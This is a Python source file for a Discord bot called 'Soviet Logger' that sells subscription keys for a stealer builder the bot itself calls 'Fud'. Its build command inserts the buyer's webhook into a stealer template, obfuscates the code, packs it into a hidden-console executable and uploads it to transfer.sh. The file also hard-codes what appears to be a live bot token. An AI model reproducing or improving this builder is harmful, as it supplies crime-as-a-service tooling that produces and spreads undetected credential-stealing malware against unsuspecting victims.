import discord
import random
import string
import shutil
import os
import subprocess
import requests
import uuid
import asyncio
import concurrent.futures

from pystyle import *
from pystyle import Colors, Colorate
from discord.ext import commands

intents = discord.Intents.all()

config = {
   'token': "MTE1MzA0MTI1MjY2NTc5ODY3Ng.G3XzkM.uBFOKwtxmMYmuRhoweoCyQZRVRhdy1UnW1iVwM",  # BOT TOKEN
   'authid': ['1148554558251999242', '1099412668068143175', '987049478433427589', '1060537803789828156', '1152261134775234632',], # ADMIN ID PERSON WHO CAN GENNERATE KEYS [CAN ONLY BE 1 ID]
   'name': "Soviet Logger", # NAME OF BOT for example since its EXO its going to say "EXO Builder"
   'embedcolor': "0x010a03", # the color code has to have 0x infront of the hex code always
   'prefix': ">" # change prefix to whatever you want
}

# 0xFFFF00 <- yellow
# 0x702963 <- purple

os.system('cls')
os.system('title Stub Builder Bot [github.com/ox-y]')
banner = f"""

         [Developer = 7cp_]
                          
                Prefix = [{config['prefix']}]

  ╔══════════════════════════════════════╗ 
  ║         |Loaded Commands <3|         ║
  ║                                      ║
  ║ -------------------------------------║
  ║             Client Commands          ║
  ║ -------------------------------------║
  ║                 {config['prefix']}help                ║
  ║               {config['prefix']}features              ║
  ║                {config['prefix']}about                ║
  ║               {config['prefix']}prices                ║
  ║                {config['prefix']}build   
  ║   
  ║ -------------------------------------║
  ║             Admin Commands           ║
  ║ -------------------------------------║
  ║               {config['prefix']}genkey                ║
  ║              {config['prefix']}Blacklist              ║
  ║                {config['prefix']}ban                  ║
  ║               {config['prefix']}unban                 ║
  ║ -------------------------------------║
  ╚══════════════════════════════════════╝  

"""

print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(banner)))
bot = commands.Bot(command_prefix=f"{config['prefix']}", intents=intents, help_command=None)

def black():
    try:
        with open("blacklist.txt", "r") as f:
            lines = filter(None, f.read().splitlines())
            return set(map(int, lines))
    except FileNotFoundError:
        return set()

blacklist = black()

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("This isn't a command you retard :money_mouth: :astonished: :face_with_spiral_eyes: :disappointed: :rofl:")

@bot.command(name='ban')
async def banu(ctx, user_id: int):
    authed = config['authid']
    if str(ctx.message.author.id) not in authed:
        await ctx.send("Who do you think you are, bro?")
        return
    if user_id in blacklist:
        await ctx.send("This user is already banned. Lmao, L bozo.")
        return
    with open("blacklist.txt", "a") as f:
        f.write(str(user_id) + "\n")
        blacklist.add(user_id)
    await ctx.send(f"<@{user_id}> has been banned.")

@bot.command(name='unban')
async def unbanu(ctx, user_id: int):
    authed = config['authid']
    if str(ctx.message.author.id) not in authed:
        await ctx.send("Who you think you are bro")
        return

    if user_id not in blacklist:
        await ctx.send("This dude aint banned")
        return

    with open("blacklist.txt", "r") as f:
        lines = f.readlines()
    with open("blacklist.txt", "w") as f:
        for line in lines:
            if str(user_id) not in line.strip():
                f.write(line)

    blacklist.remove(user_id)
    await ctx.send(f"<@{user_id}> has been unbanned")


@bot.command(name='help')
async def lolhelpdude(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']}", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ──────━━────── •●• ───────**

     ** You Are Banned From Bot **

**━────── •●• ──────━━────── •●• ───────**
""",
        )
    else:
        embed = discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=int(config['embedcolor'], 16))
        embed.add_field(
            name="Help : All Commands",
            value=f"""
        **━────── •●• ─────━ Client Commands ━────── •●• ─────━ **

        **{config['prefix']} • features**```Command to show all {config['name']} features```
        **{config['prefix']} • info**```Info (who developer is and bot prefix)```
        **{config['prefix']} • about**```About us```
        **{config['prefix']} • price**```Prices for {config['name']}```
        **{config['prefix']} • build <webhook> <key>**```Command to build stub```

        **━────── •●• ─────━ Admin Commands ━────── •●• ─────━**

        **{config['prefix']} • genkey <userid>**```cmd to generate keys```
        **{config['prefix']} • blacklist <userid>**```cmd to revoke user key```
        **{config['prefix']} • ban <userid>**```cmd to ban user```
        **{config['prefix']} • unban <userid>**```cmd to unban user```

        """
        )

    await ctx.reply(f"{ctx.author.mention} these are all of the cmds", embed=embed)

@bot.command(name='features')
async def sfeatures(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ──────━━────── •●• ───────**

     ** You Are Banned From Bot **

**━────── •●• ──────━━────── •●• ───────**
""",
        )
    else:
        # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Features",
            value="""

**━────── •●• ─────━ Features ━────── •●• ─────━**

         **• build <webhook> <key>**
         
**━────── •●• ──────━━────── •●• ───────**
""",
        )

    await ctx.reply(f"{ctx.author.mention} **This is our main feature**", embed=embed)

@bot.command(name='about')
async def abu(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ──────━━────── •●• ───────**

     ** You Are Banned From Bot **

**━────── •●• ──────━━────── •●• ───────**
""",
        )
    else:
        # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="Deadly is Daddy fr :3", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ─────━ About Us ━────── •●• ─────━**

                    ** DESC **

                **Fud stealer bot**
       **its still on beta so report issues**
    **━────── •●• ──────━━────── •●• ───────**
""",
        )

    await ctx.reply(f"{ctx.author.mention} **These are all the info needed i guess**", embed=embed)

@bot.command(name='info')
async def inf(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ──────━━────── •●• ───────**

     ** You Are Banned From Bot **

**━────── •●• ──────━━────── •●• ───────**
""",
        )
    else:
        # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ─────━ Developer ━────── •●• ─────━**

                  **Bot By 7cp_**

**━────── •●• ─────━ Prefix ━────── •●• ─────━**

                    **Prefix >**

**━────── •●• ──────━━────── •●• ───────**
""",
        )

    await ctx.reply(f"{ctx.author.mention} **This is the prefix and the developer of the bot**", embed=embed)

@bot.command(name='price')
async def ss(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ──────━━────── •●• ───────**

     ** You Are Banned From Bot **

**━────── •●• ──────━━────── •●• ───────**
""",
        )
    else:
        # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""
**━────── •●• ─────━ Prices ━────── •●• ─────━**

          ** These Are All Our Plans **

                 ** 10$ - week **
                 ** 20$ - month **
                 ** 30$ - lifetime **

**━────── •●• ──────━━────── •●• ───────**
""",
        )

    await ctx.reply(f"{ctx.author.mention} **These are the available prices**", embed=embed)

def generatek():
    return "".join(
        random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        for _ in range(10)
    )

@bot.command(name='genkey')
async def genkeyy(ctx, user_id: str):
    authed = config['authid']
    if str(ctx.message.author.id) not in authed:
        await ctx.send("Who do you think you are bro")
        return

    key = generatek()
    with open("KEYS.txt", "a") as file:
        file.write(f"{user_id}:KEY-{key}\n")

    user = await bot.fetch_user(int(user_id))
    await user.send(f"<:001star:1153682588595146752> | **Here is your key <@{user_id}> :** `KEY-{key}`")
    await ctx.reply(f"<:001star:1153682588595146752> | **Here is your key <@{user_id}> :** `KEY-{key}`")


@bot.command(name='blacklist')
async def blacklistk(ctx, userid: str):
    authed = config['authid']
    if str(ctx.message.author.id) not in authed:
        await ctx.send("Who do you think you are bro")
        return

    with open("KEYS.txt", "r") as f:
        lines = f.readlines()

    with open("KEYS.txt", "w") as f:
        for line in lines:
            if not line.startswith(f"{userid}:"):
                f.write(line)

    embed = discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
    embed.add_field(name=f"{config['name']}", value=f"```{userid}'s key has been revoked```")
    await ctx.reply(f"{ctx.author.mention} **Key has been removed or expired**", embed=embed)

CEE = concurrent.futures.ThreadPoolExecutor(max_workers=100)

building_lock = asyncio.Lock()

@bot.command(name='build')
async def buildstub(ctx, webhook: str, key: str = "default"):
    if building_lock.locked():
        await ctx.send(":x: | Someone is already building, please wait...")
        return

    async with building_lock:
        if isinstance(ctx.channel, discord.DMChannel):
            server_channel_id = 1153659828259000360   # replace with your server channel ID
            server_channel = bot.get_channel(server_channel_id)

            await ctx.send("<:5922verifiedicon:1153682729771221052> | **webhook:** **VALID**\n<:5922verifiedicon:1153682729771221052> | **Building file in <#1153659828259000360>**\n<:5922verifiedicon:1153682729771221052> | ||Deadly is Daddy||")
            await build_file(server_channel, webhook, key, ctx.author.id)
        elif ctx.message.author.id in blacklist:
            embed = discord.Embed(title=f"{config['name']} Builder", description="`Deadly is Daddy fr`", color=0x010a03)
            embed.add_field(name=f"{config['name']} Info", value="""
    **━────── •●• ──────━━────── •●• ───────**

             **You Are Banned From Bot**

    **━────── •●• ──────━━────── •●• ───────**
    """)
            await ctx.send(embed=embed)
        else:
            await build_file(ctx.channel, webhook, key, ctx.author.id)

async def build_file(channel, webhook, key, user_id):
    with open("KEYS.txt", "r") as f:
        keys = [line.strip().split(":") for line in f.readlines()]
    valid_key = [str(user_id), key] in keys
    if not valid_key:
        await channel.send(f"Sorry, <@{user_id}>, that's not your key silly :smiling_face_with_3_hearts: :scream: :heart_eyes: :stuck_out_tongue: :money_mouth:")
        return

    UI = str(uuid.uuid4())
    sf = f"Logger_{UI}.py"
    ef = f"Logger_{UI}.exe"

    shutil.copyfile("Source.py", sf)
    with open(sf, "r+", encoding="utf-8") as f:
        content = f.read()
        f.seek(0, 0)
        webhook_url = webhook
        content = content.replace('%webhook%', webhook)
        f.write(content)

    embed_build = discord.Embed(title=f"<:14_redblackstar:1153682716215226408> {config['name']}", description="", color=0x460000)
    embed_build.add_field(name="", value=f"<:1_:1153682591967350854> | ``status`` : Building... \n\n <:2_:1153682608320937985> | ``user`` : <@{user_id}>")
    message_build = await channel.send(embed=embed_build)

    subprocess.run(f"python obf.py --junk {sf} -o {sf} ", shell=True, check=True)
    subprocess.run(f"pyinstaller --onefile --noconsole {sf} --name {ef}", shell=True, check=True)

    # Upload the file using transfer.sh
    with open(f"dist/{ef}", 'rb') as f:
        response = requests.put("https://transfer.sh/{}.exe".format(UI), data=f)
        if response.status_code == 200:
            file_url = response.content.decode()
        else:
            file_url = 'Failed to upload file'

    embed_completed = discord.Embed(title=f"<:14_redblackstar:1153682716215226408> {config['name']}", description="", color=0x0a4600)
    embed_completed.add_field(name="", value=f"<:5922verifiedicon:1153682729771221052> | ``status`` : Completed... \n\n<:2_:1153682608320937985> | ``user`` : <@{user_id}> \n\n <:13aes_black890353300107575327bla:1153682712742330368> | ``Download`` : [Link]({file_url})", inline=False)
    message_completed = await channel.send(embed=embed_completed)

    os.remove(sf)
    os.remove(ef)
    shutil.rmtree("build")

    # Wait for 30 seconds before releasing the lock
    await asyncio.sleep(2)
    building_lock.release()

bot.run(config['token'])